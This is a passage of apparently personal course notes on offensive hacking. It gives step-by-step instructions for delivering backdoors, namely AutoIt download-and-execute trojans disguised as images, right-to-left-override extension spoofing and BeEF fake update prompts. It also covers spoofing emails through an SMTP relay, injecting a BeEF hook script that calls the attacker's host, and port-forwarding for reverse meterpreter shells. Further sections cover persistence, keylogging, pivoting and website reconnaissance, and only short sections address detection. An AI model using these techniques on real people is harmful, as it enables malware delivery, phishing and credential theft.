- now we gained access successfully

### iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
- directs the exe downloads from bettercap to bdfproxy

## Preventing Client Side attacks
- make sure to not to be targeted by man in the middle attack
- protecting us from it is explained earlier
- download only from HTTPS pages, it is enough the website to be HTTPS, the download link should also be encrypted with it
- check the MD5 of the file after download from *www.winmd5.com*
- if the file is configured on the way, like inserting a backdoor, then it will change the MD5 hash of it
- compare the hash created with winmd5 with the hash provided in the website where we downloaded the file

## Social Engineering
- earlier client side attacks needed user interaction but did not ask user to do anything
- but to run them we needed to become the man in the middle
- next attacks do not require us to be the man in the middle
- we will build a certain strategy for specific users
- we are going to gather detailed information about the target(friends, most used websites etc)
- then the strategy will depend on that informations
- we can pretend to be a friend of the target to ask for running a specific file with backdoor

## Maltego
- an information gathering tool about anything(people, websites, computers, companies, phone numbers etc)
- critical for information gathering
- password is 15
- you can add more transformers to the tool in the homepage
- *transformer* is a plugin to allow you to gain information about specific things
- to start a new session, click the icon at the top left
- on the left, there are types to get information from
- drag them on the board to use them
- you can also find social media like instagram, facebook, twitter there
- once dragged, set the attributes of the dragged item from the bottom right
- and then right click on the item to select what type of information we want
- discover and select the suitable one
- it generally asks for hint strings to look for, if you know nothing, just put a space there
- double click entitites to inspect them better

## Combining the backdoor with any file
- not only depend on the exe files, generate a generic solution
- when the target runs the downloaded file with any extension, our backdoor will also run in the background
- in the script *autoit-download-and-execute.txt*, we see urls section
- here, put all the websites, urls, files from our locals that should be opened when the script is used
- note that the opened items should be direct, no user interaction should be needed to see the image in url, or open the executable
- put the file the target wants to open and also our local backdoor to it by giving the url *http://<our-ip>/<path-to-backdoor>*
- separate urls with only comma, you can enter as many urls so you want there
- then to run the script, change *.txt* to *.au3*
- the program *compile script to exe* changes this file to *.exe*
- this program also allows us to change the icon of the file to hide it
- if this file is supposed to be an image, then the icon should show a preview
- look for an image to icon converter at this case
- after the conversion, take the *.exe* file to the */var/www/html/<folder>* to provide it to your website
- then listen for incoming connections while providing the file to the target
- there is a problem which is that when the target downloads the file, the file looks like an image and acts like an image while working but its
extension is *.exe*

## Changing the Extension of the .exe File
- to hide our backdoor further, we must change the extension of our file to the type that is compatible with the file from *.exe*
- to do this, we use a method named *right to left override character*
- this makes the file name is read from right to left after a specific character is seen, even if the last part is actually *.exe*
- for example, we want to convert *image.exe* to *image.jpg*
- we insert a special character after *image*, and write *imagegpj.exe*
- this name is seen from user as *imageexe.jpg* even if the extension is actually *.exe*, but we can not get rid of *.exe* part appearing in the
name part
- so use a name where the ending *.exe* looks normal
- to inset the special character, use the program *characters*, install it as *gnome-characters*
- from this program, look for *right-to-left-override* character
- this is an special unicode character
- when pasted, the change should take place immediately
- browsers sometimes delete the special character, so to overcome this, zip the file
- in zip files browsers do not change the special characters, do not forget to set the zip filename so that it is the same as the original except
the extension
- then put this zip file into our website folder, */var/www/html/<folder>*

## Fake Email Delivery
- you can send fake emails that looks like it is sent from any address
- in the mail, pretend to be a friend, company, website and ask the target to do something
- you can fake an update, send a backdoored image, ask to visit a webpage, literally anything
- use the information you gathered earlier to determine the content of the mail
- for example, select a friend you found in Maltego and get his/her email address and then pretend to be that person by using that email address to
ask the target to download something
- you can look for *spoof email* websites, but because they are used frequently for spamming other people, most of them now are labeled as spams
directly in gmail, yahoo etc
- to bypass this, use you own server if you have a web hosting plan, sign up to a web hosting plan already prepared or sign up to a *SMTP server*
(mail server)
- a lot of websites providing SMTP servers are paid but you get good results with them because they are used by actual marketers and companies to
send emails, so these mails will not labeled as spam
- *sendinblue* is a good website offering this service and has a free plan also
- go to *transactional* section to see the settings for the server provided by the website, they are used to authenticate to SMTP servers
- then we use *sendemail* program in Kali to send fake emails using these informations provided

## sendemail
- tool to send fake emails by using the information provided by the SMTP server provider, *sendinblue.com*
- use the *-xu, -xp and -s* options the authenticate, to login to the server to send an email
- the rest of them configures the details of the email
- use all of them in one long command
- this method of sending fake email and backdooring works as long as the backdoor works in the target operating system

### -xu <address>
- specifies the username for the STMP server

### -xp <password>
- specifies the password for the STMP server

### -s <server>:<port>
- specifies the server and the port used

### -f
- the sender address
- we fake here
- make sure it is a real email to be not suspected

### -t
- the receiver addresses

### -u
- the title of the email

### -m
- the message body of the email
- to send the backdoored file we create, first upload it to a webserver(for example, Dropbox)
- then share the link of it, but change the last number in the url from *0* to *1*
- this change makes the browser automatically download the file

### -o message-header=<header>
- the message header where the sender's name is shown
- set the header following exactly this setting "From: <name-showing-in-the-inbox> <<fake-sender-mail>>

## Using a Web Hosting
- paid services are again better because most used ones by people are now blacklisted so they are marked as spam automatically or may even not
deliver it
- *000webhost.com* is a good website providing it
- click *other* on *what do you want to do*
- then come up with a website name
- we are going to upload something to do website to choose to upload files
- in the website, *public_html* contains the files that are loaded by default when it is opened

## BEEF
- *Browser Exploitation Framework*
- allows to launch attacks on a hooked target
- targets are said to be hooked when they load a hook url
- redirect the target to the hook url by dns spoofing, social engineering or inject the hook in visited websites when we are man in the middle
- username : beef
- password : yourbodytalks
- open the link with *<ip>:3000/ui/panel* in the web browser
- in the section online browsers, there are online browsers that are hooked to beef that we can control
- in the section offline browsers, we see the browsers we were able to control before
- to hook a browser to beef and be able to control it, we need the browser to execute a specific javascript code
- it is given by beef in the terminal with *<ip>:3000/hook.js*
- when this code gets executed on a web browser, it will show up in the online browsers and we will be able to run commands on it, showing fake
pages and gaining control on the system
- it works on browsers supporting javascript, basically all new modern browsers, regardless of the device or the os(phone, tablet)
- to gain control on the browser running on target machine, the target should load a page that contains this hook javascript code
- this can be done by dns spoofing, injecting the hook in web pages when man in the middle, using a *xss* exploit or using social engineering to
get the target to open a specific web page
- to run the script automatically when our local website with our ip is loaded, go to */var/www/html/index.html*
- type *<script src="http://<our-ip>:3000/hook.js"></script>*
- do not forget to start the built-in server by *service apache2 start*
- when the target loads the hooked page, their ip address should appear in the online browsers section
- in that section, there are a lot of information about the browser of the target
- in the logs tab, there are the events happened before
- in the commands tab, there are useful tools to execute to gain control of the computer completely
- in the proxy tab, you can use the browser as a proxy
- in the xssrays tab, it shows if the hooked page has any xss vulnerablities
- in the network tab, you can see the current overview of the network
- to use beef for the targets outside the network, configure port *3000* on your computer because it is the port that beef uses to hook
- also, now in hook file, use the public ip, the above html code of the script should be changed to
*<script src="http://<public-ip>:3000/hook.js"></script>*

### Hooking when we are MITM
- earlier, we were able to inject javascript codes to websites loaded by the target
- using the same method, now inject the hook javascript file to every page loaded
- this way, when the target uses the web browser, the hook is applied immediately
- use *inject_beef.js* as the loaded payload to every url
- in this file, change the ip address to your ip
- to do this, go to the *hstshijack.cap* file in the bettercap directory as in the *Injecting Javascript Code* section
- in the *payloads* line, add the path of the *inject_beef* file with *\*:* at the start to inject it to all loaded websites
- then use bettercap to catch all the datas going to and from the target computer with *bettercap -iface <interface> -caplet <.cap>*
- in the bettercap, activate hstshijack with *hstshijack/hstshijack* to inject the code

### Using Commands on the Browser
- just use user interface to find the suitable command and then execute from the bottom right
- for example, search for alert in the commands and use *create alert dialog* to make the website alert some message
- *raw javascript* lets us execute a javascript code directly on that browser
- *spyder eye* lets us take a screenshot of the current state of that browser
- *redirect browser* lets us redirect the browser to any website we want
- it can be used to show a web page downloading an update with a backdoor to trap the user
- *pretty theft* pops up a fake login prompt for the selected social media account saying the session is expired and when the target enters
username and password, it directly comes to us

### Opening a Meterpreter Session
- again in the commands section, select the *fake notification bar <target's browser>* attack
- it will tell the target that there is an update and ask to install it, but it will actually contain backdoor in it
- you can use the same backdoor you were using opening a meterpreter session
- just add it in your domain with your ip, it should be *rev_http_808.exe*
- now in beef, give the full url for the backdoor, like *http://<ip>/<backdoor.exe>*
- rename the backdoor as something nonsuspicious, like *update*
- set a suitable notification test to fool the target
- do not forget to listen to incoming connections with metasploit

## Detecting Files with Backdoors
- analyzing trojans
- check the properties of the downloaded file
- if it shows *.exe* where it should have been an pdf or jpg, then it is suspicious
- check the type of the file in the details section, if it is an application but it should not have been, then that would be a trojan
- try to rename the file, the inserted string reverse character would be revealed with this
- if the expected file is also an exe, then catching backdoors is more difficult
- open the *resource monitor* if we are using windows, go to the network section where we can see the used ports in this pc
- look at the remote addresses there where we see the ip address of the machine we are connected
- if it is a website, it is obvious from the ip
- if it is an ip of a computer we do not know, then it is suspicious
- use *reverse dns lookup* from the internet which shows the corresponding target from a given ip address
- so if the given ip is dangerous, we could catch it by using this service

### Using a Sandbox
- an online sandbox service executes the given file and analyzes it
- looks if any ports are opened, any suspicious thing is modified etc
- it is a controlled environment so the service gives report of any changes
- *www.hybrid-analysis.com* is a good website for this job

## Attacking Outside the Network
- to make the backdoors, beef work for the targets outside the network, we must configure our router to handle reverse connections properly and
direct these connections to our computer
- as known previously, the devices in the network communicate with the internet through the router, requests and responses are sent to the router
at first, and they reach the destination from there
- inside a network, each device has its own private ip which are used to establish connection only within the network, they can not be not used
to transfer data outside the network
- the ip address we see in the infconfig is our private ip
- a router has 2 ip addresses : public and private ip
- private ip is used inside the network
- public ip is used outside the network which is accessible by the internet
- when you surf in the internet, your ip address will not appear as your ip address in the network, it is the public ip of the router because
it is actually the router making the requests in the internet, not our computer
- so in devices in the same network, all request are appeared to be done from the same ip address, in other words, the router
- in our attacks with both beef and backdoor, we try to establish a reverse connection
- but our private ip is not visible anymore so we should use the public ip of the router and configure the router to forward the connections to
our computer on the specific ports
- learn the public ip of the router by googling "whats my ip"

### Generating and Sending Backdoor
- it is the same as before when we generate for local ip, except we now set the LHOST to our public ip
- use payload 9 in veil, *cs/meterpreter/rev_http.py*
- listen to incoming connections on your local ip, because you have control only on your computer, it is not possible to listen to connections on
the router
- then set up ip forwarding to tell that for example, when a connection comes to port 8080, forward it to our compute

## route -n
- shows the router local ip
- check it from here if it is not the first ip in the subnet

## Configuring the Router to Forward Connections
- go to the router domain in the web browser
- domain is the roouter local ip
- log in with username and password
- look for ip forwarding, it may named as virtual network, it should show a page allowing to redirect ports
- set the internal and external ports to the port that we prepared for the backdoor
- set the ip address for our computer to connect to it
- there is another important detail : the target needs to download the backdoor but it is in our local domain
- to overcome this, for kali, also add a new configuration fot port 80
- port 80 is necessary because the built-in web server *apache2* in kali works on port 80
- after this adjustment, to access our local domain outside the netwowrk, go to the public ip domain
- the router will forward it to our local domain and others can access the backdoors in there

## Meterpreter
- after opening a session by a backdoor and listening the connection, we can use a lot of commands
- run *sessions -l* in the metasploit to see the current open sessions
- to go into a session, run *sessions -i <session-id>*

### help
- lists all commands that can be used

### background
- ctrl+c in the terminal
- throws the current session to the background, allowing us to interact with metasploit for further exploitations

### sysinfo
- shows information about the target hacked computer

### ipconfig
- just like ipconfig in windows
- shows all the interfaces in the target computer

### ps
- shows all the processes running on the target computer

### migrate <process-id>
- changes the root of our session seen by resource monitor or task manager
- *explorer.exe* is a very safe choice for this job because we know it will be always open as long as windows runs
- so our interactions from port 8080 or whatever it is will appear as if it is done by the process *explorer.exe*

### pwd

### ls

### cd

### cat

### download <file>
- downloads the file from target computer to ours

### upload <file>
- uploads the file from our computer to the target one

### execute -f <file>
- executes the file on the target computer
- the file must be in the target computer, not ours

### shell
- converts the meterpreter interface to the target operating system's shell interface
- so we can easily use windows shell to speed up our work

## Maintaining Access to the Target
- with normal backdoors we use, we lose connection when the target computer is shut down
- to overcome this, there are several methods, last of them is much more reliable and not seen by antivirus programs

### Service Payloads
- in the veil, use a *rev_http_service* or *rev_tcp_service* instead, they are 7 and 9 in the list
- you can directly use them while hacking or execute them when we open a meterpreter session with a normal backdoor
- a little buggy so do not always works

### Persistence Module in Meterpreter
- in meterpreter, there is a module called persistence
- execute it by *run persistence <options>*
- run with *-h* to see the options to set
- use *-U, -i, -r, -p*
- do not forget to listen the incoming connections in another tab
- it is detectable by antivirus programs so it is not preferred

### Persistence Module in Metasploit
- after opening a session, background it and use a new module *exploit/windows/local/persistence*
- then set its options
- *DELAY* is the interval to connect back to us from the target, 10 seconds is good
- *EXE_NAME* is the showing up under the processes, *browser.exe* is a good choice
- *SESSION* is the session id which this module will be used on, do not forget to set it
- then type *show advanced* to see advanced options that can be set on the current module
- here, *set EXE::Custom <path-to-used-backdoor>*
- lastly, *exploit* to run the persistence attack so that the target connects to us everytime
- metasploit gives a file to delete the backdoor from the target once we are done, so use it when you are finished with the target

## Key Logging in Meterpreter
- this feature lets us see keyboard and mouse events running on the target computer
- so this way, we can capture usernames and passwords
- type *keyscan_start* to start the module in meterpreter
- type *keyscan_dump* to see all the entries done so far, meterpreter organizes them in a nice list
- type *keyscan_stop* to stop the keyboard sniffer
- type *screenshot* to save a screenshot of the target computer to ours
- these commands help us see what the target is currently doing on the computer

## Pivoting
- it is the usage of a hacked computer to hack into other computers in the network
- it is used when the target is not accessible by us directly, but a computer we can access can also access our target
- this can be useful when we are not in the same network as our target, but we hack into a computer in our network which is also in the same network
as our target
- to seperate connections between virtual machines, go to VirtualBox Settings> Network> Nat Networks
- create a new network here to have 2 seperate networks
- go to the Windows machine network settings in VirtualBox, add a new adapter to it, configure it like first except that the network name
- go to the Metasploitable machine network settings in VirtualBox, change the current network name to the new one
- now kali and windows machines are in the same network, also windows and metasploitable machines are in the same network
- in meterpreter, type *ifconfig* to see all the interfaces connected from the target, choose a target here and get their ip
- we will set up a route between our subnet and the target's subnet
- now background the session and set up the route like shown below

### Autoroute
- it is a module in metasploit to set up routes between subnets
- enable it in metasploit by typing *use post/windows/manage/autoroute*
- configure its settings by *set SESSION <session-id>* and *set SUBNET <XX.XX.XX.0>*
- the subnet entry is the ip of the real target except the last part is 0
- now *exploit* to access the machines that are in the new subnet
- all the devices in the second network are accessible to us now and we can attack them using their local ip as before

## Website
- a website is just an application installed on a computer
- that computer has better specs than our everyday use computer but fundamentally it is a computer
- it has an operating system and applications to allow it to act as a web server
- the main 2 applications are the web server and database
- webserver example is *Apache*, database example is *MySQL*
- the webserver contains, understands and executes the web application
- the application code might be written in PHP, python etc but the important thing is that the webserver understands it
- the database contains the data used in the web application
- all of these database and web server applications are stored in a computer called *server*
- this computer must have internet connection and it has a real ip address so that anybody can access it
- anytime we request a page or run a web application, it is executed on the server, not on the client's computer
- then the server sends a *HTML* page including results ready to be read by the user or the client
- when we type an url or domain name in our device, it first goes to a *DNS server* to be translated to the corresponding ip address
- then our request goes to the computer running with that ip and that computer runs the relevant code to our request
- after it executes and reaches a result, it prepares a HTML markup page to present it to us
- if we send a reverse shell or a virus to be executed on the target server, it must be in a language that it understands and executes
- there is an exception in *javascript*
- it is a client-side language, the websites running javascript code executes it in the client's computer
- so if we inject a virus to the javascript code, it will allow us to do things not on the server but on the person running that code

## Attacking a Website
- as stated earlier, the website is installed on a computer
- so the attacks we learned so far also works for website attacking
- server-side attacks are tested again the same way
- the website is actually managed and maintained bu humans so it is possible to run client-side attacks
- if both of them fail, we test the web application by penetration testing
- this attack allows us to hack into the website, not computer but they are all interconnected so we can jump from one to another

## Web Application Penetration Testing
- we are going to use Metasploitable to host a server to hack into
- in Metasploitable, all the files in its local website are stored in */var/www*
- access to that website from other computers in the same network using its local ip in the browser
- this website is just an application installed on the web browser
- to penetration test these websites from zero, we downgrade their security level
- go to *DVWA*, its username is *admin* and password is *password*
- go to *DVWA Security* and set the security level to low
- also go to *Mutillidae* and set its security level to 0

## Information Gathering
- the first thing to do before attacking a website
- we try to get the ip address for the website, domain name, technologies used in it (which programming languages are used, what kind of server is
it, which database is being used etc), DNS records, unlisted files, subdomains that are not listed to other people
- to do information gathering, we can use Maltego, just start now with a website
- use Zenmap or Nexpose for vulnerabilities

## Whois Lookup
- it is a protocol used to find owners of a internet resource
- for example; a server, ip address or domain
- there are lots of websites providing this service, *whois.domaintools.com* is a good choice
- when you type in a domain or ip address, a page shows up containing a lot of information about the owner of the website
- *Server type* is important because it tells the software used in the website and we can find exploits by researching the vulnerabilities of that
software
- it also shows the operating system used in the server

## Netcraft
- it shows the technologies used by the website
- its domain is *sitereport.netcraft.com*
- it also shows the general information just like Whois Lookup
- again, we can see the information about the server here
- you can find the trackers used in the website in the *Web Trackers* section(google is watching)
- *Site Technology* is the critical section here
- in this section, we see the software of the server in the first part
- in the Server-Side, we see the programming languages the website uses, it is important because we create payloads in one of those languages
- in the Client-Side, we see the programming languages run on the browser
- if we create a backdoor in PHP(server-side language), it will run on the server
- if we create a backdoor in javascript(client-side language), it will run on the users who visit the website
- in the Blog and below, we see the web applications running on the website
- if we can find a vulnerability and exploit one of them, we can use it to get in to the system
- search for them in *Exploit Database* to see if there is an exploit for one of them(generally not Sadge)
- also look for web hosting service used in the website, if we can not find anything useful, we can try to hack into web hosting service to get
access to the website

## Robtex DNS Lookup
- it shows a comprehensive report about the website
- *robtex.com* is the website doing this job
- there are a lot of sections in the report, jump to the one you need

### Analysis
- general information about the target
- the ip number is important because if we can not hack into the target website, we try to hack into any website installed in the same server
- because these websites run in the same computer, we can access the target website through other websites

### Quick Info
- a short summary of the general informations

### Reverse
- performs a *reverse DNS lookup*
- in reverse lookup, we use an ip address to see which domains link to this ip address
- this way, we learn other websites hosted on this server and hacking one of them is sufficient to get access to the target website
- it does not always show all the websites in the same server
- you have to click "view report as HTML" to see the list

### Records
- more detailed information of the DNS records

### SEO
- search engine optimization
- ranking of the website according to Alexa

### WOT
- web of trust reputation

### DNSBL
- DNS block information
- contains websites known to send spam

## Websites on the Same Server
- generally, a server contains a large number of websites
- if we can not find a vulnerability on the target website, we try the websites installed on the same server
- if we can hack into just one of them, we can gain access to the whole server because it is a computer
- then we can navigate to the target website in the server
- websites existing on the same server means they have the same ip address because public ip address is unique to the router or the computer
- to find the websites pointing to a specific ip, use *robtex.com*
- also you can list the websites with a specific ip by searching *ip:<ip>* in Bing

## Subdomain
- urls generally come as *subdomain.target.com*
- for example, *www*, *mail*, *beta*, *user*
- some websites have subdomains for their own users(employees or customers)
- so they are not advertised unless you are one of that users
- in search engines, subdomains are not seen and there is not a link leading to them
- they might have vulnerabilities allowing to gain access to the server but we do not know about them because they are not advertised
- when websites install an update or add new features, they are installed in a specific subdomain, for example *beta*
- in these subdomains, there are experimental things and there is more chance to find a vulnerability in them
- use *Knock* to find subdomains of a website
- the subdomains are not forbidden pages to load, they are just not shown to other people so they do not know the existence of that page

## Knock
- it finds subdomains of a target website
- go into the "knockpy" folder in the terminal
- then use the command *python knock.py <ip>*
- it will show some information about the websites and lists the results of a search for subdomains
- to navigate to those subdomains, just copy paste the url to the web browser

## Files and Directories in the Website
- files and directories stored in the target website or the server
- this files are important because they could contain valuable information about the website
- when we navigate to a directory in a website, the url changes to *<earlier-url>/<directory>*
- we use Metasploitable's server to do experiments
- to execute or open a file in a website, just go to *<earlier-url>/<file>*
- with different links in a website, we access different types of files and folders
- but there are also the files and directories we can not see and access via links
- 


